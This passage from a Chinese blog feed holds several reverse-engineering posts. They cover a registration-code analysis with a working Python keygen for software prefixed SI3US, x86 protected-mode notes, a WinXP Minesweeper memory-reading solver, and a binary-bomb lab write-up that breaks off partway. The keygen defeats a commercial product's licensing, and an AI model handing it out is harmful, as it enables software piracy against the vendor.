函数，并向其传递第二段的地址，推测第三段的产生与第二段相关</p><p>sub_4F62D4：</p><p><img src="../img/10.png" alt="1"></p><p>很简单的逻辑，初始化 v4 为第二段 atoi 的值，拿第二段的 6 个字符逐位与 dword_5A8A54 数组中的值异或，每次异或完加上 4 * v4，最后再模 0x186A0</p><p>所以注册码应该形似 SI3US-XXXXXX-xxxxx</p><br><p>python 脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># ~ first</span></span><br><span class="line">f = <span class="string">&quot;SI3US&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ~ middle</span></span><br><span class="line"><span class="comment"># ~ d1 = dword_53CA80</span></span><br><span class="line">d1 = [<span class="number">12345</span>, <span class="number">123456</span>, <span class="number">234567</span>, <span class="number">345678</span>, <span class="number">456789</span>, <span class="number">567890</span>, <span class="number">678901</span>, <span class="number">622800</span>, \</span><br><span class="line"><span class="number">765392</span>, <span class="number">622800</span>, <span class="number">197704</span>, <span class="number">197497</span>, <span class="number">569235</span>, <span class="number">197497</span>, <span class="number">1977</span>, <span class="number">995216</span>, \</span><br><span class="line"><span class="number">655206</span>, <span class="number">567890</span>, <span class="number">62368</span>, <span class="number">197497</span>, <span class="number">567890</span>, <span class="number">25263</span>, <span class="number">685</span>]</span><br><span class="line">d1 = <span class="built_in">set</span>(d1)</span><br><span class="line"><span class="comment"># ~ abort the forbidden 23 digits in d1</span></span><br><span class="line">d1 = <span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">range</span>(<span class="number">100000</span>, <span class="number">999999</span>)) - d1)</span><br><span class="line">d1 = [<span class="string">&quot;%06d&quot;</span> % i <span class="keyword">for</span> i <span class="keyword">in</span> d1]</span><br><span class="line">m = random.choice(d1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ~ last</span></span><br><span class="line"><span class="comment"># ~ d2 = dword_5A8A54</span></span><br><span class="line">d2 = [<span class="number">0x96</span>, <span class="number">0x95</span>, <span class="number">0x10</span>, <span class="number">0x23</span>, <span class="number">7</span>, <span class="number">0x15</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">0x10</span>, <span class="number">0x11</span>]</span><br><span class="line">l = <span class="built_in">int</span>(m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">l = (d2[i] ^ <span class="built_in">ord</span>(m[i])) + <span class="number">4</span> * l</span><br><span class="line">l %= <span class="number">0x186A0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s-%s-%05d&quot;</span> % (f, m, l))</span><br></pre></td></tr></table></figure><br><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>链接：<a href="https://pan.baidu.com/s/1GCk6sUavIukRs50rYeW_Xw">网盘</a><br>提取码：8ww4</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>保护模式</title>
      <link href="/2020/03/15/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/15/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h2><blockquote><p>选择子与描述符</p></blockquote><p>保护模式下的寻址不再像实模式一样通过各个段寄存器乘上 16 再加偏移，各个段寄存器中存储的值实际上变成了一个<strong>索引</strong>，该索引指向了描述符表中的表项，我们就将<strong>段寄存器</strong>(CS, DS, ES, SS, FS, GS)的值看作一种<strong>段选择子</strong>，将对应<strong>表项</strong>称为段描述符</p><p>描述符表分为全局描述符表(GDT)，局部描述符表(LDT)和中断描述符表(IDT)，它们的基址由<strong>全局描述符表寄存器(GDTR)</strong>，<strong>局部描述符表寄存器(LDTR)</strong>与<strong>中断描述符表寄存器(IDTR)</strong>提供，其对应的表项也分为全局描述符，局部描述符，中断描述符等</p><p>一个描述符为 8 bytes，它详细定义了存储器段的起始地址，界限，访问属性等信息</p><br><p>段选择子(16 bits)的结构：</p><p><img src="../img/x1.png" alt="寻址方式"></p><ul><li>高 13 位为描述符在表中的索引，因此共能寻址 8k 个描述符</li><li>TI 位为 0 表示描述符在 GDT 中，为 1 表示在 LDT 中</li><li>RPL 有两位，可以表示从 0 ~ 3 的请求优先级，表示给出当前选择子的程序段的权限级别</li></ul><br><p>描述符(8 bytes)的结构（上为高 32 位，下为低 32 位）：</p><p><img src="../img/x2.png" alt="寻址方式"></p><ul><li>G：段界限的粒度位<ul><li>G = 0 表示段界限以字节为单位，范围为 0B ~ 1M</li><li>G = 1 表示以 4k 为单位，范围为 0K ~ 4G</li></ul></li><li>D/B：默认的操作数或堆栈指针大小，该位规定了指令是怎样访问寄存器与存储器数据的。<ul><li>D = 0：16位指令模式，兼容 16 位程序，指令在默认情况下使用 16 位的地址与 16 位寄存器</li><li>D = 1：32位指令模式</li><li>对于堆栈段来说，该位被称为 “B” 位，规定隐式堆栈操作时，使用 SP 还是 ESP</li></ul></li><li>L：64位代码段标志</li><li>AVL：指示该段是否有效<ul><li>AVL = 0 表示段无效（不可用）</li><li>AVL = 1 表示段有效</li></ul></li><li>P：段存在位，用于指示描述符所描述的段是否在内存中<ul><li>P = 0：只建立了描述符，还未加载入内存，产生异常中断</li><li>P = 1：在内存中</li></ul></li><li>DPL：描述符的特权等级，有两位，权限由 0 到 3 依次减弱</li><li>S：指定描述符的类型<ul><li>S = 0：系统段</li><li>S = 1：代码段或数据段</li></ul></li><li>TYPE(S = 1时)：访问权限字段<ul><li>对于<strong>数据段</strong>，这四位分别是 X, E, W, A<ul><li>X = 0：不可执行</li><li>X = 1：可执行</li><li>E = 0：向高地址生长</li><li>E = 1：向低地址生长</li><li>W = 0：只读</li><li>W = 1：可读可写</li><li>A：已访问位，若该段最近被访问，则置 1</li></ul></li><li>对于<strong>代码段</strong>，这四位分别是 X, C, R, A<ul><li>X, A 同上</li><li>C = 0：非特权级依从段（下面有解释）</li><li>C = 1：特权级依从段</li><li>R = 0：不可读</li><li>R = 1：可读</li></ul></li><li>数据段总是不可执行的(X=0)，代码段总是可执行的(X=1)</li></ul></li><li>TYPE(S = 0时)：系统描述符类型<ul><li>TYPE = 0, 8, 10, 13：保留字段</li><li>TYPE = 1：可用的 16 位任务状态段(TSS)描述符</li><li>TYPE = 2：LDT 的段描述符</li><li>TYPE = 3：正忙的 16 位 TSS 描述符</li><li>TYPE = 4：16 位调用门</li><li>TYPE = 5：任务门</li><li>TYPE = 6：16 位中断门</li><li>TYPE = 7：16 位陷阱门</li><li>TYPE = 9：可用的 32 位 TSS 描述符</li><li>TYPE = 11：正忙的 32 位 TSS 描述符</li><li>TYPE = 12：32 位调用门</li><li>TYPE = 14：32 位中断门</li><li>TYPE = 15：32 位陷阱门</li></ul></li></ul><p>特权级依从的含义（一致性代码段和非一致性代码段）：</p><ul><li>非依从的代码段只能从与它特权级相同的段调用，或是通过门调用</li><li>依从的代码段允许从低特权级的代码段转移到该段执行</li></ul><br><blockquote><p>地址空间</p></blockquote><p>保护模式下有三种地址空间：逻辑地址空间，线性地址空间和物理地址空间</p><p>程序给出的地址通常为逻辑地址（包含选择子和偏移），在描述符表中查询后，得到线性地址，再经分页机制处理后，得到实际物理地址</p><p>从逻辑空间到线性地址空间的映射方式如下：</p><p><img src="../img/x3.png" alt="寻址方式"></p><p>线性地址空间到物理地址空间的映射在下面会讲到</p><br><h2 id="调用门，任务门，中断门与陷阱门"><a href="#调用门，任务门，中断门与陷阱门" class="headerlink" title="调用门，任务门，中断门与陷阱门"></a>调用门，任务门，中断门与陷阱门</h2><p>门在本质上是一个描述符</p><blockquote><p>调用门</p></blockquote><p>调用门用于在不同特权级之间进行程序控制转移，它安装在 GDT 或 LDT 中，定义了目标代码段的选择子、入口地址偏移等，结构如下：</p><p><img src="../img/d1.png" alt="调用门"></p><p>调用门访问代码段的实现过程：</p><p><img src="../img/d2.png" alt="调用门"></p><blockquote><p>中断描述符表(IDT)</p></blockquote><p>在讨论剩下三个门之前，先来看看什么是 IDT</p><p>IDT 是一个系统表，它的每一个表项对应一个中断或异常向量（描述符），表界限为 2048 bytes，也就是说最多可以存放 256 个描述符</p><blockquote><p>任务门，中断门与陷阱门</p></blockquote><p>这三个门都可以安装在 IDT 中，由第 40 ~ 43 位的 TYPE 字段区别</p><p><img src="../img/d3.png" alt="中断门，陷阱门与任务门"></p><p>中断门与陷阱门的区别：通过中断门进入中断服务程序时，CPU 会将 IF 标记位复位，防止嵌套中断的发生，而通过陷阱门进入服务程序时则维持 IF 标志不变</p><br><h2 id="程序不可见寄存器"><a href="#程序不可见寄存器" class="headerlink" title="程序不可见寄存器"></a>程序不可见寄存器</h2><blockquote><p>GDTR 与 IDTR(中断描述符表寄存器)</p></blockquote><p>保存描述符表的基址与界限（最大长度 64k），在使用之前，需进行初始化，结构如下：</p><p><img src="../img/c1.png" alt="程序不可见寄存器"></p><blockquote><p>Task Register(任务寄存器) 与 LDTR</p></blockquote><p><img src="../img/c2.png" alt="程序不可见寄存器"></p><p>LDT 的位置是从 GDT 中选出的，当需要访问 LDT 时，将选择子装入 LDTR 中，选择子访问 GDT，把 LDT 的描述符装入 LDTR 的 Cache 中</p><p>TR 包含一个选择子，用来访问一个任务的描述符，任务通常是进程/应用程序，它们的描述符存储在 GDT 中</p><br><p>保护模式下，段寄存器还有程序不可见的区域——高速缓冲器(Cache)，与 CPU 中的一级、二级高速缓冲不同，当段寄存器中的数发生改变，CPU 访问描述符表，并把描述符装入 Cache 中，一直保存直到段寄存器再次发生变化，这样就能在 CPU 重复访问同一个段时，节省不必要的查询时间</p><br><h2 id="分页机制（两级页表）"><a href="#分页机制（两级页表）" class="headerlink" title="分页机制（两级页表）"></a>分页机制（两级页表）</h2><p>线性地址通过分页机制透明地转化为真实物理地址，涉及的寄存器如下：</p><p><img src="../img/f1.png" alt="分页机制"></p><ul><li><p>CR0 的 最高位 PG 需置为 1，表示按页管理存储空间，否则程序给出的线性地址即为物理地址</p></li><li><p>CR3 的 高 20 位为页目录基址，为页转换部件寻址存储器中以 4k(4096 bytes) 为边界的页目录表</p></li></ul><p>每个<strong>页目录表</strong>包含 1024 个<strong>页目录项</strong>，每项长 4 bytes，每个<strong>页目录项</strong>又寻址一个包含 1024 项的<strong>页表</strong>，<strong>页表</strong>每项的长同样是 4 bytes，每个<strong>页表项</strong>又指向物理地址中一个连续的 <strong>4k</strong> 对齐的区域</p><p>因此，每一个<strong>页目录项</strong>代表存储器的一个 4M(1024 * 4k) 的区域，一个程序有 4G 的线性地址空间，正好需要 1k 个<strong>页目录项</strong>来存储，一个任务所需要的用于存储表的连续空间由原来的 1M(单级页表) 变成了现在的 4k，而且这些页目录项当程序需要时才会加载到页目录表中，在很大程度上节省了内存空间</p><p>页目录项(PDE)与页表项(PTE)的结构如下：</p><p><img src="../img/f2.png" alt="分页机制"></p><ul><li>P：存在位标志，表示当前条目所指向的页表或者页是否在内存中</li><li>R/W：读写权限标志，为 0 表示只读，为 1 表示可读可写</li><li>U/S：用户/超级用户标志，指定一个页或者一组页的特权级</li><li>PWT：用于控制对单个页或者页表的 Write-back 或 Write-through 缓冲策略</li><li>PCD：用于控制对单个页或者页表的缓冲</li><li>A：表示页或者页表最近是否被访问</li><li>D：表示页或者页表最近是否被写入</li><li>PS：决定页的大小</li><li>G：表示是否为全局页</li><li>Avail：保留字段</li></ul><br><p>程序给出的线性地址由三部分构成：</p><p><img src="../img/f3.png" alt="分页机制"></p><p>因为页目录表与页表的表项数都是 1024，所以用 10 bits 来寻址即可，如上图中的 22 ~ 31 位与 12 ~ 21 位，而低 12 位的偏移用来寻址 4k 物理页中的一个字节</p><p>寻址的流程大致如下：</p><p><img src="../img/f4.png" alt="分页机制"></p><ul><li>将线性地址的高 10 位取出作为页目录表的索引，乘 4 后与页目录寄存器(CR3)提供的页目录表基址相加找到其中的表项</li><li>将找到的页目录表项高 20 位（4k 对齐，低 12 位无用）作为页表的基址，与线性地址中间 10 位乘 4 后相加找到其中对应的页表项</li><li>找到的页表项高 20 位即为一个物理页的基址，与线性地址的低 12 位相加即可精准定位 4k 页面中的每一个字节</li></ul><br><p>然而，在地址转换的过程中，由于要查页表，因此用户每访问一次存储单元，实际需要访问主存两次，这两次访问主存几乎使程序运行速度下降一半，为了解决这个问题，创造了<strong>快表(TLB高速缓冲存储器)</strong>，将经常使用的页表项通过页替换策略放置在快表中，每次访问地址时先到快表中查找，没找到再访问页目录和页表</p><br><h2 id="TSS-任务状态段-与任务切换"><a href="#TSS-任务状态段-与任务切换" class="headerlink" title="TSS(任务状态段) 与任务切换"></a>TSS(任务状态段) 与任务切换</h2><blockquote><p>TSS 结构</p></blockquote><p>TSS 是保存任务状态信息的系统段，其结构如下(104 bytes)：</p><p><img src="../img/t1.png" alt="TSS"></p><p>TSS 的结构可以大致分为以下几个部分</p><ul><li><strong>寄存器保存区域</strong>(偏移 32 ~ 95)：用于保存通用寄存器、段寄存器、PC 指针及标志寄存器。当 TSS 对应的任务正在执行时，该区域是未定义的；在当前任务被切换出时，各寄存器的值就会保存在对应位置；下次切换回原任务时，再从保存区域恢复寄存器的值</li><li><strong>内层堆栈指针区域</strong>(偏移 4 ~ 27)：为了实现有效的保护，同一个任务在不同的特权级下会使用不同的堆栈，故一个任务拥有 4 个堆栈，也就需要 4 个堆栈指针，如 SS0 与 ESP0 就是特权级为 0 时的全指针。然而 TSS 中并没有指向特权级为 3 的堆栈指针，因为 3 级是最外层，任何向内层的转移都不会转移到 3 级</li><li><strong>地址映射寄存器区域</strong>(偏移 28 处双字与偏移 96 处单字)：虚拟地址空间到线性地址空间的映射由 GDT 与 LDT 确定，与特定任务相关的部分由 LDT 确定，而 LDT 又由 LDTR 中的选择子确定；线性地址空间到物理地址空间的映射在分页机制下由 CR3 确定。当程序改变了 LDTR 或 CR3 时，必须将新值通过别名技术填入 TSS 对应字段中，否则 CPU 从来不向该字段自动写入。在任务切换时，CPU 自动从要执行的任务的 TSS 中取出这两个字段装入 LDTR 和 CR3，改变虚拟空间到物理空间的映射。</li><li><strong>链接字段</strong>(偏移 0 处的双字)：如果当前任务由 CALL/中断/异常激活，那么该字段保存被挂起任务的 TSS 选择子，并且将 EFLAGS 中的 NT 位置 1，使该字段有效。返回时，由于 NT 为 1，RET 或 IRET 指令将使控制流回到上一个任务，从而实现任务的嵌套机制</li><li><strong>I/O许可位图基址</strong>(偏移 102 处的单字)：这个字段的数值是 I/O 允许位图相对于任务状态段起始位置的偏移地址，即多个任务状态段可以共用一个 I/O 许可位图。位图中一个 bit 表示一个 I/O 端口，为 0 表示端口可用，反之不可用</li><li><strong>T字段</strong>(偏移 100 处单字的最低位)：调试陷阱字段。在发生任务切换时，如果进入任务的 T 位为 1，则在新任务第一条指令执行前产生调试陷阱</li></ul><br><p>那么 CPU 是怎么找到安装在 GDT 中的 TSS 的呢，之前提到了一个叫 Task Register 的寄存器，通过 TR 中 Cache 载入的 TSS 描述符就可以访问 TSS 了，流程如下：</p><p><img src="../img/t2.png" alt="TSS"></p><p>TSS 描述符的结构之前已经给出，当 S = 0，TYPE = 1/3/9/11 时，表示该描述符为 TSS 描述符</p><blockquote><p>任务切换</p></blockquote><p>TR 中存储着当前正在使用的 TSS 选择子，当使用 “call/jmp + 新 TSS 选择子” 指令时，CPU 至少做了三件事：</p><ul><li>将当前所有寄存器(TSS结构中的那些寄存器)的值装入当前 TR 指向的 TSS 中</li><li>将新 TSS 选择子加载到 TR 中，同时将段描述符加载到 TR 不可见部分</li><li>将新 TSS 中的寄存器信息覆盖到各寄存器中</li></ul><p>被加载到 TR 中的 TSS 描述符就从可用状态变成了正忙状态(Busy)，同时有可能设置链接字段、产生调试陷阱等</p><blockquote><p>任务返回</p></blockquote><ul><li>将当前所有寄存器的值装入当前 TR 指向的 TSS 中</li><li>取链接字段的值装入 TR 中</li><li>恢复调用者保存的现场</li></ul><br><h2 id="实模式向保护模式转换"><a href="#实模式向保护模式转换" class="headerlink" title="实模式向保护模式转换"></a>实模式向保护模式转换</h2><p>刚给机器加电或硬件复位 CR0 中 PE 位时，系统处于实模式</p><p>在将 PE 位置 1 时，还需对环境进行初始化，初始化的内容有：</p><ul><li>IDT：使其至少包含前 32 种中断类型的有效中断门</li><li>GDT：使其索引为 0 的项为空描述符，且至少包含一个有效的代码段描述符，一个数据段描述符和一个堆栈段描述符</li><li>PE：置为 1，表示进入保护模式</li><li>JMP：执行一条段间 JMP 跳转指令清除内部指令队列，并且把 TSS 描述符的基址装入 TR</li><li>段寄存器：将初始选择子的值装入各段寄存器中</li></ul><br><p>另一种适合多任务操作系统进入保护模式的方式是操作系统利用任务切换来进入保护模式，步骤如下：</p><ul><li>初始化 IDT</li><li>初始化 GDT，使其最少有两个 TSS 描述符和初始任务所需要的原始代码段及数据段描述符</li><li>初始化 TR，使其指向一个 TSS</li><li>进入保护模式后，执行一条段间 JMP 跳转指令清除内部指令队列，并且把当前 TSS 选择子装入 TR</li><li>使用一条远转移指令装载 TR 寄存器，以便访问新的 TSS 并保存当前状态</li></ul><br><h2 id="虚拟-8086-模式"><a href="#虚拟-8086-模式" class="headerlink" title="虚拟 8086 模式"></a>虚拟 8086 模式</h2><p>虚拟 8086 模式（以下简称 V86 模式）是保护模式下的一种工作方式，该模式使得多个 8086 应用软件同时运行，PC 机上运行的 DOS 程序就是运行在这种模式下的。通常利用时间片技术来实现多任务并发</p><p>V86 模式与保护模式的区别在于 CPU 对段寄存器的解释方式，V86 模式对段寄存器的使用方式与实模式相同，能够寻址 1M (20根地址总线)的存储器单元</p><p>当 EFLAGS 寄存器的 VM 为 1 时，表示 CPU 处于 V86 模式，然而 80386 没有提供直接改变 VM 的指令，且只有当前特权级 CPL 为 0 时，对 VM 的改变才有效</p><p>进入 V86 模式的方式有两种</p><ul><li>IRET 指令</li><li>任务切换</li></ul><p>相应的，离开 V86 模式的方式也有两种</p><ul><li>80386 中断门/陷阱门</li><li>任务切换</li></ul><p>详细的工作细节参见 <a href="https://blog.csdn.net/spadgerz/article/details/53086820">csdn</a> 博文</p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>分析winxp扫雷游戏</title>
      <link href="/2020/03/08/%E5%88%86%E6%9E%90winxp%E6%89%AB%E9%9B%B7%E6%B8%B8%E6%88%8F/"/>
      <url>/2020/03/08/%E5%88%86%E6%9E%90winxp%E6%89%AB%E9%9B%B7%E6%B8%B8%E6%88%8F/</url>
      
        <content type="html"><![CDATA[<p>昨天分析了一下 WinXP 自带的扫雷游戏，现在记录一下，分以下几个部分</p><ul><li>找到关键函数</li><li>分析函数逻辑与雷区结构</li><li>用易语言写一个秒解扫雷的程序</li></ul><br><h2 id="找到关键函数"><a href="#找到关键函数" class="headerlink" title="找到关键函数"></a>找到关键函数</h2><p>这一步用 CE 来找会很快，我用 ida + OD 来讲一下思路</p><p>首先把 winmine.exe 拖进 ida，因为是有 gui 的程序，肯定会用到很多 win32 API，到 idata 段找找有没有可疑的 引用，在 user32.dll 里发现了 BeginPaint 和 EndPaint</p><p><img src="../img/1.png" alt="winmine"></p><p>交叉引用查 BeginPaint，可以发现是 1001C45 的地方在调用</p><p><img src="../img/2.png" alt="winmine"></p><p>在 OD 里下个断点，就断在这个地址</p><p>运行起来发现扫雷窗口出现，但是东西都没有画出来，在 call BeginPaint 之前压入了扫雷的窗口句柄，那么接下来应该就是画出完整图形了</p><p><img src="../img/3.png" alt="winmine"></p><p>上图在 BeginPaint 和 EndPaint 中间夹着的那个红框call F8 步过之后，确实画出了所有区域</p><p><img src="../img/4.png" alt="winmine"></p><p>那就步入这个函数</p><p><img src="../img/5.png" alt="winmine"></p><p><img src="../img/6.png" alt="winmine"></p><p><img src="../img/7.png" alt="winmine"></p><p><img src="../img/8.png" alt="winmine"></p><p>最后 call 10026A7，雷区的格子就画完了，在 ida 中分析一下这个函数</p><p><img src="../img/9.png" alt="winmine"></p><p>这里有个嵌套循环，循环结束的判据是 1005334 和 1005338，推测分别为列数和行数，在 OD 中确认一下</p><p><img src="../img/10.png" alt="winmine"></p><p>1005334 为 0x1E（30），1005338 为 0x18（24），确实为扫雷自定义最大的规格（24行30列），同时可以发现下面的区域 8F，0F，10 交错出现，推测为雷区</p><p><img src="../img/11.png" alt="winmine"></p><p>接下来我们来找程序处理鼠标点击的函数</p><p>玩过的都知道，如果在雷区按住鼠标左键不松开，是不会被视作单击雷块来处理的，也就是说消息为 WM_LBUTTONDOWN 的时候程序应该就简单的获取鼠标坐标来确定按下的是哪一块，并且做图形处理，将按下的效果显示出来。只有当鼠标左键抬起后，才显示是否有雷，所以重点应该是 WM_LBUTTONUP 消息</p><p>于是我们跳去 TranslateMessage 函数下一个条件断点，拦截程序对 WM_LBUTTONUP 的处理</p><p>下好断点，单击第一个雷块，一路跟踪程序来到 call 10037E1，到 ida 中分析</p><br><h2 id="分析函数逻辑与雷区结构"><a href="#分析函数逻辑与雷区结构" class="headerlink" title="分析函数逻辑与雷区结构"></a>分析函数逻辑与雷区结构</h2><p><img src="../img/12.png" alt="winmine"></p><p>在这个函数末尾的有对数组 byte_1005340 的操作，这里的 edx 和 eax 是用户点击的行号和列号</p><ul><li>test 指令用于判断取出的字节是否已经被点击过且不是雷（就是那些已经被点开，显示周围有多少个雷的格子）</li><li>and + cmp 用来判断该字节低四位是否为 E，也就是是否为被右键标记过的格子</li></ul><p>满足以上两点的格子会被直接忽略，点了也没用，如果是没被点开也没被右键标记过的格子，就调用 1003512</p><p>1003512 这个函数首先判断了点击的这个格子是否为雷</p><p><img src="../img/13.png" alt="winmine"></p><p>如果不是雷就调用 1003084</p><p><img src="../img/14.png" alt="winmine"></p><p>从下图可以看到，该函数调用了 8 次 1003008，对点击格子周围 8 个格子都进行了遍历</p><p><img src="../img/15.png" alt="winmine"></p><p>通过调用 1002F3B 查询周围 8 个格子有多少个雷，返回值放在 eax 中，拿 eax 和 0x40 与再赋值到数组对应位置，也就是说点击的格子不是雷，其内存中对应的字节就是 0x40 + 周围 8 个格子雷数，如果周围格子里没有雷，该坐标就会被保存到 10051A0 和 10057C0 两个数组里，这样的坐标都会被自动”点击”，实现一个变相递归</p><p><img src="../img/16.png" alt="winmine"></p><p>逻辑部分差不多到这里了，毕竟不是想把整个扫雷逆下来，直接去看雷区结构估计还快点</p><p>OD 内存窗口跳到 1005340，根据之前的分析，一行是 32 个字节，0x10 是边界，尝试点击第一个格子</p><p>点击前：</p><p><img src="../img/17.png" alt="winmine"></p><p>点击后：</p><p><img src="../img/18.png" alt="winmine"></p><p>符合之前的分析</p><p>一顿尝试之后，发现 0x8F 是雷且没有被点击，0xF 是安全且没有被点击，0x8E 是雷且被右键标记了，0x0E 是安全且被标记了</p><br><h2 id="用易语言写一个秒解扫雷的程序"><a href="#用易语言写一个秒解扫雷的程序" class="headerlink" title="用易语言写一个秒解扫雷的程序"></a>用易语言写一个秒解扫雷的程序</h2><p>有了之前的分析，就可以写个程序来读取内存中的雷区数组，一个字节一个字节地判断，遇到 0x8F 就给窗口发送 WM_RBUTTONDOWN 和 WM_RBUTTONUP 的消息，模拟右键标记，其他情况就模拟鼠标左键点击</p><p>用到了如下几个 API：</p><p>user32: FindWindowA，PostMessageA</p><p>kernel32: OpenProcess，CloseHandle，ReadProcessMemory </p><p>效果如图：</p><p><img src="../img/19.png" alt="winmine"></p><br><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>链接：<a href="https://pan.baidu.com/s/1WcIB5nNulq_lez5daftJaw">网盘</a><br>提取码：nm81</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二进制炸弹第五关+彩蛋</title>
      <link href="/2020/03/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E7%AC%AC%E4%BA%94%E5%85%B3-%E5%BD%A9%E8%9B%8B/"/>
      <url>/2020/03/01/%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%82%B8%E5%BC%B9%E7%AC%AC%E4%BA%94%E5%85%B3-%E5%BD%A9%E8%9B%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>最近学校布置了一道实验 —— 超级二进制炸弹2018版，基础的有四关，每一关都需要输入一个字符串来拆弹。因为每一关的算法都不同，所以需要逆向分析找出合适的字符串来通关。</p><p>在前四关都完成后，程序会询问是否要进行第五关也就是其所谓的不可能任务。</p><p><img src="../img/1.png" alt="bomb"></p><p>第五关完成后，还会提示有隐藏彩蛋，其实彩蛋也是通过第五关输入的字符串来控制显示的，本文对第五关与彩蛋通关过程进行了分析。</p><p>PS. 资源在文末</p><br><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>必须先声明的是 <strong>GenerateRandomNumber</strong> 函数从原理上来说并不是随机的，main 函数的开头会根据你的命令行参数（也就是学号）来初始化 rand1_l 和 rand1_h</p><p><img src="../img/2.png" alt="bomb"></p><p>从图中可以看到，调用了一个 stoul 函数，将学号转换成了无符号长整型（32 位 long 是 4 字节），并赋值给全局变量 rand1_h，同时 rand1_l 被赋值为 666</p><p>之后每调用一次 GenerateRandomNumber，rand1_h 与 rand1_l 都会根据自身当前的值被修改，这个随机数函数的实现细节这里就不赘述了。因为第五关我是纯 ida 静态分析的，并没有进行调试，所以随机数都是用 python脚本来生成的。在这里提一句，就是为了之后展示脚本做铺垫。</p><p>如果你偏好于直接调试看返回结果，也可以通过一些手段来绕过 IsDebuggerPresent 的检测，就无需关心随机函数的实现细节了。当然，如果你感兴趣，也可以试着分析一下，我后面也有写这个函数的 python 版本。</p><p>那么我们开始吧！</p><br><h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>贴一张 phase_impossible 函数的伪代码</p><p><img src="../img/3.png" alt="bomb"></p><p>首先调用 GetTickCount 函数来获取一个时间，一般这个函数是配套出现的，代码前面放一个，后面放一个，然后两个时间一减就知道代码执行时间了。但这里只有开头有，迷惑.jpg，这就是所谓的执行超时检测吗，先放一边，接着分析</p><p>接下来的一个 do-while 循环不难看出是用来计算第五关输入字符串（a1）长度的，而且长度不能大于 768</p><p><img src="../img/4.png" alt="bomb"></p><p>然后判断是否存在调试器，存在就直接引爆，看来这就是反调试的地方了，怎么绕过后面再说</p><p><img src="../img/5.png" alt="bomb"></p><p>再接下来就是对输入字符串的处理和判断了</p><p><img src="../img/6.png" alt="bomb"></p><ul><li><p>声明了一个局部字符串数组 v2，并将其中的内容全部初始化为 0（memset函数）</p></li><li><p>调用 tohex 函数，其有两个参数，一个是刚初始化了的 v2，另一个是输入字符串，初步猜测可能是将输入处理后放到 v2 中</p></li><li><p>调用 GenerateRandomNumber 修改 rand_div 的值</p></li><li><p>调用 check_buf_valid 检查 v2 字符串是否合法，同时传了个 rand_div 的值，猜测是否合法可能与 rand_div 有关</p></li></ul><p>最后一部分：</p><p><img src="../img/7.png" alt="bomb"></p><p>生成一个 0 ~ 2 的随机数</p><ul><li>等于 0，依次调用 goto_buf_0，goto_buf_1，goto_buf_2</li><li>等于 1，依次调用 goto_buf_1，goto_buf_2</li><li>等于 2，调用 goto_buf_2</li><li>最后调用 explode_bomb</li></ul><p>就这么看起来好像不管输什么最后都会爆，那就挑 goto_buf_0 来分析一下</p><p><img src="../img/8.png" alt="bomb"></p><p>可以看到，这个函数很简单，就是一条 jmp eax 指令，那么 eax 是什么呢，返回到 phase_impossible 中看看调用前做了什么</p><p><img src="../img/9.png" alt="bomb"></p><p>在调用 goto_buf_0 前，将 eax 赋值为 ebp - 0x100，由下图可知，ebp - 0x100 是变量 v2 的地址</p><p><img src="../img/10.png" alt="bomb"></p><p>也就是说在调用 goto_buf_0 后，程序会跳转到 v2 处去执行，由前面的分析可知，v2 是的内容是可以控制的，且和我们的输入有关，所以这里就是提示中所说的动态生成指令部分了</p><p>我们应该分析此时的栈结构，编写相应的汇编代码，并使其在被 tohex、check_buf_valid 处理后能够执行，这段代码要能使程序的执行流返回到 main 函数中，显示第五关通关的信息</p><p>总的流程如上，接下来我们细化到函数细节，进一步分析</p><br><h2 id="GetTickCount-函数"><a href="#GetTickCount-函数" class="headerlink" title="GetTickCount 函数"></a>GetTickCount 函数</h2><p>我们来找找另一个配套的 GetTickCount 函数在哪里</p><p>ida 伪代码中点一下开头的 GetTickCount( )，然后<strong>按 x</strong> 查看交叉引用</p><p><img src="../img/11.png" alt="bomb"></p><p>来看靠上的两个地址，第一个是 phase_impossible + F，也就是 phase_impossible 在开头调用的这个</p><p>第二个红框框起来的地址是 .text: loc_4013D6，我们双击点过去看看</p><p><img src="../img/12.png" alt="bomb"></p><p>可以看到程序确实有第二次调用 GetTickCount 的想法，而且代码执行时间限制在 1s（cmp eax, 